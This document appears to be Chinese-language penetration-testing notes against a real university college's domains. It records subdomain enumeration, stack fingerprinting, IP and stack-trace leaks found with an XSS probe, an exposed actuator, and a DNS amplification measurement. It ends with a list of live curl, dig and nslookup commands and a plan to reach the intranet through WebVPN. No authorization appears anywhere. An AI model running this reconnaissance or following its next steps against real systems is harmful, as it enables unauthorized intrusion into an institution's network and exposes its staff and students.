# 南京医科大学康达学院 (NJMU KDC) 测试模式补充 (2026-06-09)

## 新发现（2026-06-09深度测试）

### 子域名枚举
```
njmu.edu.cn 子域名（subfinder+DNS爆破）:
- 核心: kdc/www/mail/oa/webvpn/ids/app/lib/tw
- 业务: ehall/jw/xg/jjjc/gh/auth/cas/sso/login/portal
- 支付: pay/ecard
- 测试: test/dev/staging/beta/demo
- 移动: m/mobile/wap/h5/miniapp/wechat/applet
- 管理: admin/api

nmukd.edu.cn 子域名:
- 核心: authserver/ehall/vpn
- 其他: zp/5gself/res/szyd
- 新增: student/teacher/faculty/staff/portal/jw/oa/mail/webvpn/ids/one/pay/ecard/lib
- 测试: test/dev/staging/beta/demo
- 移动: m/mobile/wap/h5/miniapp/wechat/applet
- 管理: admin/api/app/auth/cas/sso/login
```

### 技术栈确认
- SUDY WebPlus CMS (sudy-wp-siteId=164, jQuery EasyUI)
- 金智教育(wisedu) CAS (Server: wisedu)
- 网易企业邮箱 (qiye.163.com)
- OpenResty反向代理 (ehall.njmu.edu.cn)
- Tomcat后端
- 国密SM2算法 (sm2.js)
- EasyConnect VPN (WebVPN)

### 漏洞发现
1. **SUDY CMS IP泄露（中危）**
   - 端点: `/_web/_portal/api/user/main.psp`
   - 泄露IP: 109.122.3.227
   - **重要**: 该IP经验证为CDN/WAF的DNS服务器（香港Alice Networks LTD），非真实服务器IP
   - 域名解析到198.18.x.x网段（CDN）
   - 影响子域名: kdc/kdclib/kdjw/kdxg/kdtw/kdjjjc/kdgh

2. **邮箱系统IP泄露（中危）**
   - 端点: `https://mail.njmu.edu.cn/`
   - Cookie中: `boc_session_site` 包含 `ip_address: 109.122.3.227`
   - 同样是CDN IP，非真实服务器

3. **Tomcat堆栈跟踪泄露（中危）**
   - 端点: `/_web/_search/api/search/new.rst?keyword=<script>alert(1)</script>`
   - 触发Tomcat 400错误页面，泄露完整Java堆栈
   - 包含: Tomcat版本、Java类名、方法名、文件路径、行号

4. **8080端口Actuator暴露（低危）**
   - 端点: `http://kdc.njmu.edu.cn:8080/actuator`
   - 只暴露根路径和health，其他端点返回404
   - health状态: DOWN

### 测试但未发现漏洞
- SQL注入: 登录接口返回统一{"status":0}，无法区分用户
- 文件上传: 接口不存在或需登录
- SSRF/XXE/CORS: 未发现
- 目录遍历: 未发现
- CAS认证绕过: 有白名单保护，Open Redirect被拦截
- CAS用户枚举: 所有用户名返回相同错误"您的账号尚未激活"
- 数据库未授权: MySQL/Redis/PostgreSQL/MongoDB都有密码保护
- EasyConnect VPN: 有暴力破解防护
- 金智教育CAS历史漏洞(CNVD-2018-17443): 已修复
- .git/.svn目录: 返回301重定向但内容为空
- 敏感文件泄露: 未发现

### DNS服务发现
- 109.122.3.227 是DNS服务器，支持递归查询
- 放大系数约10.5倍（48字节查询→506字节响应）
- DNS区域传输: 失败（安全配置）
- DNS动态更新: 失败（安全配置）

### 端口扫描（109.122.3.227）
```
开放端口: 21(ftp) 22(ssh) 23(telnet) 25(smtp) 53(dns) 80(http) 
88(kerberos) 110(pop3) 111(rpcbind) 135(msrpc) 139(netbios-ssn) 
143(imap) 179(bgp) 389(ldap) 443(https) 445(microsoft-ds) 
3306(mysql) 3389(rdp) 5432(postgresql) 6379(redis) 8080(http-proxy) 
8443(https-alt) 8888(sun-answerbook) 9090(zeus-admin) 9200(elasticsearch) 
11211(memcached) 27017(mongodb)
代理端口: 1080(SOCKS) 3128(HTTP) 8080(HTTP) 8118(HTTP) 9050(TOR)
```

### 结论
目标安全防护较好，CAS有白名单保护，数据库有密码保护，VPN有暴力破解防护。只有信息泄露类中低危漏洞。建议：
- 优先测试SUDY CMS的其他子域名是否存在相同IP泄露
- 尝试通过WebVPN接入内网后进一步测试
- 关注金智教育CAS的新漏洞披露

### 测试命令汇总
```bash
# IP泄露验证
curl -sk "https://kdc.njmu.edu.cn/_web/_portal/api/user/main.psp" | grep -oP 'value="[^"]*"'

# 邮箱IP泄露
curl -sk -D- "https://mail.njmu.edu.cn/" | grep -i "ip_address"

# Tomcat堆栈跟踪
curl -sk "https://kdc.njmu.edu.cn/_web/_search/api/search/new.rst?keyword=%3Cscript%3Ealert(1)%3C/script%3E"

# 批量IP泄露检查
for sub in kdc kdclib kdjw kdxg kdtw kdjjjc kdgh; do echo -n "$sub.njmu.edu.cn: "; curl -sk "https://$sub.njmu.edu.cn/_web/_portal/api/user/main.psp" | grep -oP 'value="[^"]*"' | head -1; done

# IP验证
nslookup kdc.njmu.edu.cn
curl -sk "http://ip-api.com/json/109.122.3.227"
dig @109.122.3.227 kdc.njmu.edu.cn

# Actuator
curl -sk "http://kdc.njmu.edu.cn:8080/actuator"
```
